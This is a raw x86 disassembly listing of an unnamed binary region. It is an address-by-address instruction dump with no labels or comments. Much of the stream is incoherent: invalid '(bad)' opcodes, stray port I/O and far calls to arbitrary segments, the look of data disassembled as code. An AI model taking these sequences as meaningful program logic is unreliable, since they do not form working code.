  4279a6:	add    BYTE PTR ss:[eax],al
  4279a9:	or     al,0x6b
  4279ab:	add    BYTE PTR [eax],al
  4279ad:	in     al,dx
  4279ae:	dec    eax
  4279af:	test   DWORD PTR [eax],0xa371000
  4279b5:	sbb    esi,esi
  4279b7:	dec    edx
  4279b8:	dec    ebx
  4279b9:	ins    BYTE PTR es:[edi],dx
  4279ba:	lods   eax,DWORD PTR ds:[esi]
  4279bb:	ret    0x4080
  4279be:	add    BYTE PTR [eax],al
  4279c0:	pop    ds
  4279c1:	out    0x5c,eax
  4279c3:	mov    esi,edi
  4279c5:	lds    esi,FWORD PTR [ecx+0x6bac9524]
  4279cb:	and    ebx,DWORD PTR [ebx]
  4279cd:	cli    
  4279ce:	add    ah,bl
  4279d0:	sti    
  4279d1:	cdq    
  4279d2:	xchg   cx,ax
  4279d4:	cmp    al,0x5
  4279d6:	inc    eax
  4279d7:	out    0x0,eax
  4279d9:	add    BYTE PTR [ebx],cl
  4279db:	mov    ebx,0x909df0e2
  4279e0:	test   BYTE PTR [esi+0x0],ch
  4279e3:	add    bh,cl
  4279e5:	ins    BYTE PTR es:[edi],dx
  4279e6:	lock mov al,0x1a
  4279e9:	jnp    0x42799d
  4279eb:	imul   ecx,DWORD PTR [ebx+0x27],0x6e
  4279ef:	call   0x2b0b:0xfb1786c
  4279f6:	cmc    
  4279f7:	call   0x4199:0x2433c7f6
  4279fe:	retf   
  4279ff:	test   BYTE PTR [edx],cl
  427a01:	add    BYTE PTR [eax],al
  427a03:	push   esp
  427a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a05:	stc    
  427a06:	mov    ds:0x5ce5e6be,al
  427a0b:	pop    es
  427a0c:	mov    DWORD PTR [esi+ebx*1],esi
  427a0f:	pop    ds
  427a10:	loopne 0x427997
  427a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a13:	in     al,0x27
  427a15:	call   0xd223c08b
  427a1a:	or     ah,BYTE PTR [eax+0x4e88]
  427a20:	add    eax,0xbcdfd1f5
  427a25:	jno    0x4279e5
  427a27:	lea    ebx,[edi]
  427a29:	sbb    al,0xe2
  427a2b:	and    bl,bh
  427a2d:	popf   
  427a2e:	(bad)  
  427a2f:	div    bl
  427a31:	retf   
  427a32:	pop    ds
  427a33:	jbe    0x427aab
  427a35:	jae    0x427a8c
  427a37:	push   ds
  427a38:	mov    esp,0x5c552618
  427a3d:	retf   
  427a3e:	add    BYTE PTR [edi+0x0],bh
  427a41:	add    BYTE PTR [edx-0x2b33c0ba],al
  427a47:	add    BYTE PTR [eax],al
  427a49:	add    al,0xa0
  427a4b:	add    BYTE PTR [eax],al
  427a4d:	sbb    esi,eax
  427a4f:	out    dx,al
  427a50:	or     BYTE PTR [esi+0x0],bl
  427a53:	add    BYTE PTR [ecx+0x3d0cf6b9],al
  427a59:	add    BYTE PTR [eax],al
  427a5b:	in     eax,dx
  427a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a5d:	adc    BYTE PTR [ebp+0x7a],ah
  427a60:	inc    ebp
  427a61:	leave  
  427a62:	sbb    cl,BYTE PTR [ebx]
  427a64:	pushf  
  427a65:	xchg   BYTE PTR [ecx],al
  427a67:	pop    ebp
  427a68:	jge    0x427a5f
  427a6a:	xchg   ebx,eax
  427a6b:	jg     0x427a40
  427a6d:	adc    eax,0x3b44
  427a72:	jp     0x427af0
  427a74:	fwait
  427a75:	and    BYTE PTR [ebx-0x1cf50000],0x99
  427a7c:	test   esp,esp
  427a7e:	out    dx,al
  427a7f:	fisubr WORD PTR [esi]
  427a81:	cmp    ah,0x22
  427a84:	lods   al,BYTE PTR ds:[esi]
  427a85:	rol    esp,0xc6
  427a88:	add    BYTE PTR [eax],al
  427a8a:	cs test eax,0x38449015
  427a90:	add    BYTE PTR [eax],al
  427a92:	sbb    dh,BYTE PTR [ebx+0x286ba81e]
  427a98:	jb     0x427afc
  427a9a:	jp     0x427abd
  427a9c:	outs   dx,BYTE PTR ds:[esi]
  427a9d:	mov    dl,0xca
  427a9f:	test   eax,0x15c724ce
  427aa4:	jnp    0x427a5f
  427aa6:	mov    WORD PTR [edx+0x0],?
  427aa9:	add    BYTE PTR [eax+ecx*8+0x0],cl
  427aad:	add    BYTE PTR [edi+0x1900],bl
  427ab3:	mov    esp,0xb5ee2993
  427ab8:	(bad)  
  427ab9:	sub    eax,0x41a07ea5
  427abe:	jmp    DWORD PTR [ecx-0x5e6cf026]
  427ac4:	scas   al,BYTE PTR es:[edi]
  427ac5:	sbb    bh,BYTE PTR [ebx]
  427ac7:	pop    ebx
  427ac8:	cmp    eax,0xcd8e7eb3
  427acd:	test   al,0x86
  427acf:	stos   DWORD PTR es:[edi],eax
  427ad0:	in     al,0xdd
  427ad2:	aaa    
  427ad3:	jb     0x427b3b
  427ad5:	pop    edi
  427ad6:	sbb    al,0x40
  427ad8:	fld    QWORD PTR [eax]
  427ada:	add    BYTE PTR [edx],ah
  427adc:	ret    
  427add:	test   eax,0x6588
  427ae2:	out    0xb3,al
  427ae4:	mov    edx,0x1e8ecfdf
  427ae9:	ins    DWORD PTR es:[edi],dx
  427aea:	xchg   DWORD PTR [ebp+0x32],edi
  427aed:	cmp    eax,0xb1c4
  427af2:	and    DWORD PTR [edx],edi
  427af4:	lds    ebp,FWORD PTR [ebx+0x3788a190]
  427afa:	add    BYTE PTR [eax],al
  427afc:	imul   esi,DWORD PTR [edi+0x2f],0x11
  427b00:	std    
  427b01:	push   es
  427b02:	inc    esi
  427b03:	imul   eax,DWORD PTR [edi+eiz*4+0x6f450000],0xbfa2626
  427b0e:	aaa    
  427b0f:	fld    TBYTE PTR [ecx]
  427b11:	inc    eax
  427b12:	dec    ebx
  427b13:	add    BYTE PTR [eax],al
  427b15:	test   eax,0x668f0205
  427b1a:	push   cs
  427b1b:	mov    bh,0xb7
  427b1d:	ret    0x58ee
  427b20:	cli    
  427b21:	sub    DWORD PTR [ebx+0x72],ebp
  427b24:	popf   
  427b25:	xor    eax,0xd94385c3
  427b2a:	inc    edi
  427b2b:	jmp    0x7d3:0x4440
  427b32:	cmc    
  427b33:	or     ch,BYTE PTR [edi]
  427b35:	push   0x3
  427b37:	sahf   
  427b38:	enter  0x96,0x0
  427b3c:	add    cl,cl
  427b3e:	xchg   edx,eax
  427b3f:	pop    esp
  427b40:	mov    ah,0x89
  427b42:	data16 rcr cl,cl
  427b45:	test   al,0x83
  427b47:	gs jmp 0x0:0x1f081ae3
  427b4f:	into   
  427b50:	hlt    
  427b51:	test   eax,0x1ba3d652
  427b56:	inc    ebp
  427b57:	ss mov ecx,0x496d923c
  427b5e:	arpl   WORD PTR [ebx],sp
  427b60:	push   esp
  427b61:	adc    eax,0xfc8eac1f
  427b66:	cmc    
  427b67:	aas    
  427b68:	out    0x7e,al
  427b6a:	pop    ebx
  427b6b:	xchg   edx,eax
  427b6c:	dec    eax
  427b6d:	push   cs
  427b6e:	add    BYTE PTR [eax],al
  427b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b71:	je     0x427ba3
  427b73:	add    BYTE PTR [edx+0x0],cl
  427b76:	add    cl,bh
  427b78:	jns    0x427b00
  427b7a:	and    al,0x14
  427b7c:	jnp    0x427b45
  427b7e:	inc    edi
  427b7f:	(bad)  
  427b81:	rol    BYTE PTR [eax],cl
  427b83:	add    BYTE PTR [edx+0x60],bh
  427b86:	popfw  
  427b88:	cmp    esp,DWORD PTR [ecx-0x29]
  427b8b:	dec    edi
  427b8c:	aam    0x9a
  427b8e:	in     al,0xff
  427b90:	mov    dh,0xcb
  427b92:	nop
  427b93:	push   edx
  427b94:	gs push esi
  427b96:	sub    DWORD PTR ds:0x5bdb22be,0x28e3e270
  427ba0:	xchg   BYTE PTR [eax],bh
  427ba2:	cmp    esi,esp
  427ba4:	shl    BYTE PTR [eax+ebx*2-0x5a],1
  427ba8:	adc    ebp,DWORD PTR [ebx]
  427baa:	lock lods al,BYTE PTR ds:[esi]
  427bac:	push   0x30
  427bae:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bb0:	xchg   BYTE PTR [edi],ch
  427bb2:	push   ecx
  427bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bb4:	(bad)  [edx+0x160094]
  427bba:	add    BYTE PTR ds:0xfacc7b,bl
  427bc0:	add    BYTE PTR [esi+0x302b4971],cl
  427bc6:	sub    bl,ch
  427bc8:	(bad)  
  427bc9:	ins    BYTE PTR es:[edi],dx
  427bca:	out    dx,eax
  427bcb:	mov    ds,WORD PTR [eax+0x4b4cf9a6]
  427bd1:	add    BYTE PTR [eax],al
  427bd3:	repz pop esi
  427bd5:	fadd   st,st(6)
  427bd7:	pop    es
  427bd8:	lods   ax,WORD PTR ds:[esi]
  427bda:	repz pop esp
  427bdc:	cli    
  427bdd:	dec    ebx
  427bde:	dec    ebx
  427bdf:	fnstcw WORD PTR [edx]
  427be1:	nop
  427be2:	(bad)  
  427be3:	imul   eax,DWORD PTR [esi],0xffffff85
  427be6:	push   ss
  427be7:	cli    
  427be8:	lock sub BYTE PTR [esi+0x1819f426],ah
  427bef:	ja     0x427c5b
  427bf1:	leave  
  427bf2:	mov    ah,0x88
  427bf4:	jae    0x427bf6
  427bf6:	add    ah,ch
  427bf8:	push   ecx
  427bf9:	sbb    ah,BYTE PTR [ebx]
  427bfb:	or     ebp,DWORD PTR ds:0x8356d358
  427c01:	retf   
  427c02:	leave  
  427c03:	mov    ds:0x7202da69,eax
  427c08:	mov    gs,ebp
  427c0a:	jecxz  0x427bde
  427c0c:	outs   dx,BYTE PTR ds:[esi]
  427c0d:	(bad)  
  427c0e:	cmp    eax,0x2144ff
  427c13:	add    ch,bh
  427c15:	(bad)  
  427c16:	dec    edx
  427c17:	or     BYTE PTR [ecx-0x42990000],ch
  427c1d:	jecxz  0x427bd8
  427c1f:	pop    ebx
  427c20:	jnp    0x427c99
  427c22:	sub    al,0x16
  427c24:	adc    dh,ah
  427c26:	(bad)  
  427c27:	ficomp WORD PTR [eax]
  427c29:	js     0x427c6b
  427c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c2c:	add    BYTE PTR [eax],al
  427c2e:	jge    0x427beb
  427c30:	out    0xf0,eax
  427c32:	int3   
  427c33:	std    
  427c34:	add    BYTE PTR [eax],al
  427c36:	mov    WORD PTR [ebp+0x0],ss
  427c39:	add    BYTE PTR [edx-0xa],al
  427c3c:	or     ebx,DWORD PTR [ecx+0xe141007]
  427c42:	or     edx,DWORD PTR [eax]
  427c44:	xchg   dl,cl
  427c46:	mov    edi,0x2e8c
  427c4b:	mov    al,0x10
  427c4d:	stc    
  427c4e:	xchg   ebx,eax
  427c4f:	idiv   DWORD PTR [eax-0x13]
  427c52:	daa    
  427c53:	(bad)
  427c56:	test   eax,0xe917a6d0
  427c5b:	sar    DWORD PTR [ebp-0x5b],cl
  427c5e:	inc    esp
  427c5f:	clc    
  427c60:	add    BYTE PTR [eax],al
  427c62:	jbe    0x427c12
  427c64:	das    
  427c65:	add    ah,BYTE PTR [edi-0x27]
  427c68:	sahf   
  427c69:	sub    esi,DWORD PTR [esi-0x60]
  427c6c:	aad    0x49
  427c6e:	(bad)  
  427c6f:	mov    eax,0x3dcc19
  427c74:	add    BYTE PTR [edx+eax*8],dh
  427c77:	(bad)  
  427c78:	jg     0x427c96
  427c7a:	and    DWORD PTR [ebp-0x40],edi
  427c7d:	inc    esp
  427c7e:	add    BYTE PTR [eax],al
  427c80:	mov    eax,0xd2347cd9
  427c85:	(bad)  
  427c86:	jne    0x427cf8
  427c88:	jne    0x427c36
  427c8a:	pop    ss
  427c8b:	cld    
  427c8c:	rol    ecx,1
  427c8e:	xchg   DWORD PTR [ebx],ebx
  427c90:	lds    edx,FWORD PTR [edi]
  427c92:	mov    ds:0x8004db,al
  427c97:	add    BYTE PTR [edi],bl
  427c99:	ret    
  427c9a:	in     eax,0x9e
  427c9c:	and    bh,ch
  427c9e:	repz pop ebx
  427ca0:	fld    st(2)
  427ca2:	retf   0xde25
  427ca5:	aam    0x9e
  427ca7:	imul   ebp,ebp,0x3a
  427caa:	xor    DWORD PTR [edx+0x44],0xc0000a7
  427cb1:	rol    BYTE PTR [eax],cl
  427cb3:	add    BYTE PTR [edx+0x37c0],ah
  427cb9:	mov    dl,0x42
  427cbb:	imul   edx,DWORD PTR [esp+edi*1-0x40],0x28
  427cc0:	add    BYTE PTR [eax],al
  427cc2:	mov    dl,0x5e
  427cc4:	sbb    al,0xb1
  427cc6:	das    
  427cc7:	adc    eax,DWORD PTR [eax]
  427cc9:	int    0x0
  427ccb:	add    BYTE PTR [eax+0x4c],dl
  427cce:	stc    
  427ccf:	add    BYTE PTR [eax],al
  427cd1:	jmp    0x427d50
  427cd3:	mov    al,BYTE PTR ds:0x6dd90b8
  427cd9:	es ds daa 
  427cdc:	xchg   ebx,eax
  427cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427cde:	inc    eax
  427cdf:	lods   eax,DWORD PTR ds:[esi]
  427ce0:	add    BYTE PTR [eax],al
  427ce2:	fs jo  0x427c8d
  427ce5:	dec    ebx
  427ce6:	iret   
  427ce7:	sub    eax,0xd02763
  427cec:	add    BYTE PTR cs:[eax],al
  427cef:	arpl   WORD PTR [eax+0x30],bx
  427cf2:	and    DWORD PTR [ebp+0x40],ecx
  427cf5:	dec    esp
  427cf6:	add    BYTE PTR [eax],al
  427cf8:	and    ah,bl
  427cfa:	jae    0x427cc8
  427cfc:	popf   
  427cfd:	add    BYTE PTR [eax],al
  427cff:	imul   ebx,DWORD PTR [ebp-0x7],0x41
  427d03:	xchg   edx,eax
  427d04:	mov    eax,0xf80efe06
  427d09:	in     eax,dx
  427d0a:	fmul   st,st(0)
  427d0c:	adc    al,BYTE PTR [eax]
  427d0e:	add    BYTE PTR [ecx-0x2a],bh
  427d11:	sbb    BYTE PTR [edi],dl
  427d13:	loopne 0x427ccc
  427d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d16:	mov    ah,0x5
  427d18:	test   al,0x2
  427d1a:	or     al,BYTE PTR [esi]
  427d1c:	je     0x427ca6
  427d1e:	inc    eax
  427d1f:	add    BYTE PTR [eax],al
  427d21:	in     eax,dx
  427d22:	cmp    ebx,DWORD PTR [edx]
  427d24:	ds push edx
  427d26:	fdivr  QWORD PTR [ebx-0x2c1e82de]
  427d2c:	pop    ebx
  427d2d:	les    ebp,FWORD PTR [eax+eax*1]
  427d30:	add    ah,dh
  427d32:	lock mov bh,0xb6
  427d35:	pushf  
  427d36:	test   BYTE PTR [esi+0x7c830000],bl
  427d3c:	pop    ds
  427d3d:	mov    ch,0x45
  427d3f:	mov    dh,0xe7
  427d41:	sbb    dl,dl
  427d43:	cmp    ch,bl
  427d45:	dec    dl
  427d47:	xor    DWORD PTR [ecx],0xffffffc5
  427d4a:	mov    edx,DWORD PTR [edx+0x376b8220]
  427d50:	push   ebx
  427d51:	add    DWORD PTR [ebp-0x3a207517],edi
  427d57:	pusha  
  427d58:	cmp    BYTE PTR [edi+0x5b],0xd3
  427d5c:	stc    
  427d5d:	jb     0x427d34
  427d5f:	mov    cl,0xfc
  427d61:	sbb    DWORD PTR [edx+eax*1],esi
  427d64:	jb     0x427dbf
  427d66:	push   es
  427d67:	cld    
  427d68:	xor    BYTE PTR [ecx],dl
  427d6a:	out    dx,eax
  427d6b:	rol    DWORD PTR [edx+0x1a3e545d],1
  427d71:	(bad)  
  427d72:	dec    DWORD PTR [esi-0x11]
  427d75:	fst    QWORD PTR [ebp+edi*1+0x7a1616d8]
  427d7c:	cli    
  427d7d:	push   esi
  427d7e:	add    esi,DWORD PTR [edi]
  427d80:	mov    eax,0x9a39dba9
  427d85:	ret    0xe731
  427d88:	add    bl,0x0
  427d8b:	add    BYTE PTR [ecx-0x42],bl
  427d8e:	fild   DWORD PTR [edi+0x234c77]
  427d94:	add    BYTE PTR [edx+0x1c],ah
  427d97:	push   esi
  427d98:	pop    edx
  427d99:	in     al,0xfc
  427d9b:	cwde   
  427d9c:	pop    esi
  427d9d:	clc    
  427d9e:	(bad)  
  427d9f:	adc    BYTE PTR [edi+0x8],dl
  427da2:	cmp    al,BYTE PTR [eax]
  427da4:	add    al,al
  427da6:	pusha  
  427da7:	add    BYTE PTR [eax],al
  427da9:	int3   
  427daa:	inc    edx
  427dab:	add    BYTE PTR [eax],al
  427dad:	mov    bh,0x14
  427daf:	push   edi
  427db0:	stc    
  427db1:	sbb    BYTE PTR [edi+0x0],0x0
  427db5:	and    eax,0x3dd1b93f
  427dba:	pop    ebx
  427dbb:	in     al,0x90
  427dbd:	jne    0x427dc1
  427dbf:	test   DWORD PTR [ebp+0x6f851f39],esi
  427dc5:	sbb    cl,BYTE PTR [esi+ebx*8]
  427dc8:	add    BYTE PTR [eax],al
  427dca:	mov    ds,WORD PTR [edi+edx*4+0x96c497]
  427dd1:	add    bl,bl
  427dd3:	pop    es
  427dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dd5:	or     al,0xb5
  427dd7:	add    BYTE PTR [eax],al
  427dd9:	sar    DWORD PTR [esi+0x2544cf],0x0
  427de0:	(bad)  
  427de1:	out    dx,eax
  427de2:	jo     0x427d7c
  427de4:	ins    DWORD PTR es:[edi],dx
  427de5:	popf   
  427de6:	jmp    FWORD PTR [ecx+0x3]
  427de9:	jp     0x427e07
  427deb:	pop    ss
  427dec:	jo     0x427e32
  427dee:	cmp    eax,0x500c0000
  427df3:	add    BYTE PTR [eax],al
  427df5:	push   edi
  427df6:	scas   eax,DWORD PTR es:[edi]
  427df7:	(bad)  
  427df9:	push   edi
  427dfa:	call   0xd7c:0xbaa33d6
  427e01:	stos   DWORD PTR es:[edi],eax
  427e02:	jae    0x427e80
  427e04:	dec    edx
  427e05:	mov    DWORD PTR [edi],ecx
  427e07:	ret    
  427e08:	hlt    
  427e09:	mov    BYTE PTR [ebp-0x7e320000],ah
  427e0f:	inc    esi
  427e10:	repnz lea eax,ds:0xcd96a16
  427e17:	add    DWORD PTR [eax],0x0
  427e1a:	fild   DWORD PTR [ebx+0x4e]
  427e1d:	inc    ebx
  427e1e:	call   0x29d5:0x92c5de98
  427e25:	xor    eax,0x8fc4fe
  427e2a:	add    bh,bh
  427e2c:	mov    esi,0xd53b98cb
  427e31:	shr    DWORD PTR [eax+eiz*2+0x1a],cl
  427e35:	sub    cl,bh
  427e37:	push   esp
  427e38:	or     al,0x43
  427e3a:	add    BYTE PTR [eax],al
  427e3c:	(bad)  
  427e3d:	repz add BYTE PTR [eax],al
  427e40:	push   edx
  427e41:	cmp    al,0xf5
  427e43:	in     al,dx
  427e44:	jl     0x427e4c
  427e46:	ret    
  427e47:	inc    edx
  427e48:	mov    dh,0x4c
  427e4a:	retf   
  427e4b:	add    BYTE PTR [eax],al
  427e4d:	or     cl,al
  427e4f:	add    BYTE PTR [eax],al
  427e51:	int    0xb4
  427e53:	adc    dh,bh
  427e55:	ror    DWORD PTR ds:0xa94330cf,0x48
  427e5c:	push   edi
  427e5d:	add    BYTE PTR [eax],al
  427e5f:	shr    DWORD PTR [edi+eiz*8-0x2a],0x72
  427e64:	adc    bh,BYTE PTR [edx+0x2a]
  427e67:	push   ebx
  427e68:	xchg   ecx,eax
  427e69:	push   ebp
  427e6a:	pusha  
  427e6b:	and    bl,BYTE PTR [edx+ebx*1-0x4b80b993]
  427e72:	mov    al,0xd8
  427e74:	cmp    eax,DWORD PTR [edi-0x2d78c3db]
  427e7a:	jp     0x427e27
  427e7c:	dec    edx
  427e7d:	lock aam 0xea
  427e80:	sub    BYTE PTR [edi],ah
  427e82:	dec    BYTE PTR [ecx+0x1d8885]
  427e88:	add    BYTE PTR [eax+eax*2+0x0],al
  427e8c:	add    BYTE PTR [eax],bh
  427e8e:	sbb    al,0x76
  427e90:	push   ds
  427e91:	hlt    
  427e92:	ss ror ebx,cl
  427e95:	push   esi
  427e96:	jno    0x427ebc
  427e98:	rcr    BYTE PTR [ecx-0x54],cl
  427e9b:	mov    edx,0x989baf56
  427ea0:	jo     0x427e95
  427ea2:	addr16 inc ebx
  427ea4:	mov    dh,BYTE PTR [esi]
  427ea6:	fcom   QWORD PTR [ebx-0x4e]
  427ea9:	(bad)  
  427eaa:	mov    bl,0xa2
  427eac:	and    al,0xf3
  427eae:	imul   esi,DWORD PTR [edx-0x39d7dd39],0x5805f60b
  427eb8:	fmul   QWORD PTR gs:[esi]
  427ebb:	push   edi
  427ebc:	clc    
  427ebd:	add    BYTE PTR [esi+0x0],cl
  427ec0:	add    BYTE PTR [edi+0x7644],bh
  427ec6:	cmp    eax,0x14d825d4
  427ecb:	mov    ah,0x36
  427ecd:	bnd jae 0x427e5c
  427ed0:	mov    bl,0x0
  427ed2:	add    cl,ah
  427ed4:	outs   dx,DWORD PTR ds:[esi]
  427ed5:	ja     0x427ea8
  427ed7:	dec    ebp
  427ed8:	popf   
  427ed9:	cmp    al,0x22
  427edb:	jae    0x427e8d
  427edd:	push   edx
  427ede:	stos   BYTE PTR es:[edi],al
  427edf:	sbb    esi,DWORD PTR [ebx+0x3f4e674a]
  427ee5:	xor    BYTE PTR [edi-0x285b9955],cl
  427eeb:	int    0x0
  427eed:	add    al,BYTE PTR [eax]
  427eef:	add    BYTE PTR [ebx+ebp*8],bh
  427ef2:	sbb    BYTE PTR [edx+0x0],0x0
  427ef6:	jp     0x427f38
  427ef8:	xchg   edx,eax
  427ef9:	add    BYTE PTR [eax],al
  427efb:	mov    bh,0xbb
  427efd:	xchg   esp,eax
  427efe:	(bad)  
  427eff:	mov    edi,0x27ea686e
  427f04:	rcr    DWORD PTR [ebx+0x1b62ba93],1
  427f0a:	xlat   BYTE PTR ds:[ebx]
  427f0b:	cmp    ebp,DWORD PTR [edi+0x6b]
  427f0e:	xchg   DWORD PTR [esi+0x61c52fed],edi
  427f14:	adc    DWORD PTR [eax+0x28],ebx
  427f17:	push   ebx
  427f18:	adc    DWORD PTR [eax-0x19],esp
  427f1b:	arpl   WORD PTR [ebp+0x1344f9c7],sp
  427f21:	add    BYTE PTR [eax],al
  427f23:	pop    edi
  427f24:	test   DWORD PTR [ebx+0x13],0xce4b38db
  427f2b:	push   ss
  427f2c:	mov    fs,ecx
  427f2e:	jp     0x427f65
  427f30:	mov    eax,ds:0x3cc0de
  427f35:	add    BYTE PTR [ecx+0x42bb580d],al
  427f3b:	and    al,0x5f
  427f3d:	cmp    al,BYTE PTR [edi-0xf]
  427f40:	fbld   TBYTE PTR [esi+0x6c011f62]
  427f46:	ret    
  427f47:	fsub   DWORD PTR [ecx]
  427f49:	scas   al,BYTE PTR es:[edi]
  427f4a:	fs (bad) 
  427f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f4d:	outs   dx,BYTE PTR ds:[esi]
  427f4e:	int    0xfa
  427f50:	mov    al,ds:0x39c9b876
  427f55:	out    0xf7,al
  427f57:	in     eax,dx
  427f58:	jo     0x427f3d
  427f5a:	or     DWORD PTR [ebx+eiz*1-0x20],edx
  427f5e:	and    al,0x65
  427f60:	js     0x427f18
  427f62:	loopne 0x427f64
  427f64:	sldt   WORD PTR [eax]
  427f67:	nop
  427f68:	test   eax,0x88136646
  427f6d:	test   DWORD PTR [eax],0x9f823200
  427f73:	or     al,0x6c
  427f75:	add    BYTE PTR [eax],al
  427f77:	push   0x66
  427f79:	cmp    eax,DWORD PTR [esi-0x15417675]
  427f7f:	adc    eax,eax
  427f81:	mov    eax,DWORD PTR [eax]
  427f83:	add    bh,dh
  427f85:	sub    ebp,DWORD PTR [edi-0x1d0f8c35]
  427f8b:	and    eax,0x3670ba13
  427f90:	xor    dl,BYTE PTR [ecx-0x9]
  427f93:	pop    es
  427f94:	sahf   
  427f95:	in     eax,0xd5
  427f97:	inc    esp
  427f98:	cmp    al,0x0
  427f9a:	add    bl,cl
  427f9c:	out    dx,eax
  427f9d:	icebp  
  427f9e:	mov    ah,0x55
  427fa0:	jno    0x427fb4
  427fa2:	popf   
  427fa3:	fmul   DWORD PTR [ebx+edx*8+0x0]
  427fa7:	add    BYTE PTR [edi-0x4951572c],bl
  427fad:	(bad)  [eax-0x6617d819]
  427fb3:	and    al,0x3
  427fb5:	mov    eax,esi
  427fb7:	gs aad 0x2b
  427fba:	fisttp QWORD PTR [ebx]
  427fbc:	add    bh,BYTE PTR [ecx]
  427fbe:	das    
  427fbf:	pop    edx
  427fc0:	pop    edi
  427fc1:	retf   
  427fc2:	or     dl,ah
  427fc4:	sahf   
  427fc5:	into   
  427fc6:	pop    edi
  427fc7:	jns    0x427f84
  427fc9:	pcmpgtw mm2,mm4
  427fcc:	inc    BYTE PTR [eax+0xc0000f1]
  427fd2:	mov    al,0x0
  427fd4:	add    bl,dl
  427fd6:	pop    edi
  427fd7:	add    BYTE PTR [ebx],ch
  427fd9:	add    BYTE PTR [eax],al
  427fdb:	jge    0x427fd8
  427fdd:	xor    DWORD PTR [eax],ebp
  427fdf:	mov    ds:0x169415bb,eax
  427fe4:	icebp  
  427fe5:	lods   eax,DWORD PTR ds:[esi]
  427fe6:	push   es
  427fe7:	stc    
  427fe8:	push   eax
  427fe9:	adc    eax,0xb46ece30
  427fee:	dec    edi
  427fef:	pop    ds
  427ff0:	fwait
  427ff1:	mov    esp,0xf126fdab
  427ff6:	ror    BYTE PTR [ecx-0x5fb4076c],1
  427ffc:	adc    ah,BYTE PTR [esi-0x7f]
  427fff:	scas   al,BYTE PTR es:[edi]
  428000:	xor    al,0x8f
  428002:	xor    eax,DWORD PTR [ebx+0x35]
  428005:	icebp  
  428006:	test   BYTE PTR [ebx],al
  428008:	add    BYTE PTR [eax],al
  42800a:	nop
  42800b:	push   esi
  42800c:	sub    BYTE PTR ds:0x7c20d88e,bh
  428012:	leave  
  428013:	add    BYTE PTR [ecx],0xea
  428016:	dec    esi
  428017:	loop   0x428063
  428019:	or     edi,DWORD PTR [esi]
  42801b:	ins    DWORD PTR es:[edi],dx
  42801c:	adc    BYTE PTR [edi+0x2d07f6d7],dh
  428022:	sbb    dh,dh
  428024:	dec    esp
  428025:	pop    ebx
  428026:	add    BYTE PTR [eax],al
  428028:	stos   DWORD PTR es:[edi],eax
  428029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42802a:	ins    BYTE PTR es:[edi],dx
  42802b:	cmp    al,0x24
  42802d:	sbb    al,0x4c
  42802f:	jns    0x428031
  428031:	add    BYTE PTR [edx-0x3d738518],dh
  428037:	add    BYTE PTR [eax],al
  428039:	cmc    
  42803a:	gs pop ss
  42803c:	idiv   BYTE PTR [ecx+0x1fc4fdf7]
  428042:	add    BYTE PTR [eax],al
  428044:	iret   
  428045:	rol    eax,1
  428047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428048:	add    BYTE PTR [eax],al
  42804a:	xor    esp,DWORD PTR [edi+0xec00be]
  428050:	add    BYTE PTR [esi-0x5b],ch
  428053:	lea    edx,[ebx-0x5c]
  428056:	mov    cl,BYTE PTR [esp+ebx*8+0x50b30000]
  42805d:	loop   0x4280b7
  42805f:	push   ds
  428060:	cmp    BYTE PTR [esi+0x548fc96b],al
  428066:	mov    edx,0x1ede6e5a
  42806b:	and    BYTE PTR [esi-0x125556c4],dh
  428071:	shl    dh,1
  428073:	push   ds
  428074:	adc    eax,0x3677efb5
  428079:	imul   DWORD PTR [edx-0x27]
  42807c:	div    ah
  42807e:	ins    BYTE PTR es:[edi],dx
  42807f:	push   ebp
  428080:	mov    ch,0xe
  428082:	jb     0x428034
  428084:	push   eax
  428085:	sahf   
  428086:	cld    
  428087:	mov    ecx,0xa202bf05
  42808c:	mov    ecx,0x7bbdab69
  428091:	iret   
  428092:	(bad)  
  428093:	popf   
  428094:	popa   
  428095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428096:	fdivrp st(7),st
  428098:	out    0x4c,eax
  42809a:	mov    DWORD PTR [eax],0xfc658a00
  4280a0:	mov    ch,0xa
  4280a2:	cmp    al,0x6
  4280a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280a5:	aaa    
  4280a6:	sbb    ebx,DWORD PTR [edx]
  4280a8:	or     esi,DWORD PTR ss:[edx+0x2d]
  4280ac:	repz mov cl,0x9c
  4280af:	iret   
  4280b0:	retf   0x2a24
  4280b3:	mov    bh,0x66
  4280b5:	adc    ebx,DWORD PTR [ebx]
  4280b7:	pop    ss
  4280b8:	xchg   edi,eax
  4280b9:	hlt    
  4280ba:	jecxz  0x4280aa
  4280bc:	sub    eax,0x343a7e6d
  4280c1:	and    al,0xcb
  4280c3:	fdivr  QWORD PTR [ecx-0x10ac355f]
  4280c9:	pop    edi
  4280ca:	iret   
  4280cb:	sub    BYTE PTR [eax],cl
  4280cd:	add    eax,DWORD PTR [eax]
  4280cf:	add    BYTE PTR [eax+ebp*4],dh
  4280d2:	mov    ds:0x23f30a64,al
  4280d7:	mov    DWORD PTR [ecx],edi
  4280d9:	leave  
  4280da:	xchg   ebx,eax
  4280db:	push   ebp
  4280dc:	mov    edx,0xb742bfb0
  4280e1:	mov    eax,ds:0x54dbe292
  4280e6:	pminsw mm3,QWORD PTR [eax-0x1ccdead1]
  4280ed:	sub    edx,DWORD PTR [ebx]
  4280ef:	sbb    bh,cl
  4280f1:	xor    ebx,ebp
  4280f3:	fsubr  QWORD PTR [esi-0x23]
  4280f6:	loop   0x4280dc
  4280f8:	mov    bl,BYTE PTR [ebx-0x7d]
  4280fb:	adc    BYTE PTR [ebx-0x39],0xb4
  4280ff:	add    edx,esp
  428101:	pop    es
  428102:	test   BYTE PTR [ebp+0x655a0000],dh
